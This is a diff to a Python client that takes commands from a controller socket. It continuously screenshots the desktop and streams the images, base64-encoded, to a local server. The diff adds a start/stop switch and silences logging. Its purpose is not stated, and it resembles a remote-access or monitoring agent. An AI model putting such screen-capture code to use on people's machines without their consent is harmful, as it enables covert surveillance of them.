@@ -12,6 +12,8 @@ import datetime
 
 global userid
 
+
+killSnap = 0
 DEBUG = 1
 
 def log(msg):
@@ -27,6 +29,7 @@ def lockscreen_handler():
 
 
 def snap_handler(userid):
+	global killSnap
 	log('started snap handler')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("127.0.0.1", 10000))
@@ -36,20 +39,22 @@ def snap_handler(userid):
 	image_hour = image_timestamp.split('T')[1].split(":")[0]
 	image_minute = image_timestamp.split('T')[1].split(":")[1]
 	print datetime.datetime.now().isoformat()
-	for i in xrange(1000):
-		log('Getting snap num {0}'.format(i))
+	while True:
+		if killSnap:
+			log('killSnap, breaking')
+			return
 		snapshot = ImageGrab.grab() # TODO Lower quality
 		save_path = "C:\\Users\\user\\MySnapshot.jpg"
 		snapshot.save(save_path)
-		log('got snap, snapid: ' + str(snapid))
+		#log('got snap, snapid: ' + str(snapid))
 		# Send
 		f = open(save_path, 'rb')
 
 		while True:
-			log('Reading from snap')
+			#log('Reading from snap')
 			raw_data = f.read(500000)
 			if not raw_data:
-				log('breaking')
+				#log('breaking')
 				break
 			encoded_data = base64.b64encode(raw_data)
 			msg = "{0},{1},{2},{3},{4},{5}".format(userid, image_date, image_hour, image_minute, snapid, len(encoded_data))
@@ -57,7 +62,7 @@ def snap_handler(userid):
 			time.sleep(0.1)
 			s.send(encoded_data)
 			#time.sleep(0.1)
-			log('Sent snap')
+			#log('Sent snap')
 
 		# finish, remove the file
 		f.close()
@@ -79,10 +84,12 @@ def snap_handler(userid):
 
 
 def main():
+	global killSnap
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect(("127.0.0.1", 8002))
 	log('connected')
 	userid = random.randint(1,10001)
+	snap_thread = -1
 	log('userid ' + str(userid))
 	s.send(str(userid))
 	s.recv(1024)
@@ -95,9 +102,12 @@ def main():
 		req = s.recv(1024)
 		log('Do request: ' + req)
 		if req == 'snap':
+			killSnap = 0
 			threading.Thread(target=snap_handler, args=(userid,)).start()
 		if req == 'lockscreen':
 			lockscreen_handler()
+		if req == 'stopsnap':
+			killSnap = 1
 		elif req == 'nojobs':
 			log('no jobs for me!')
 
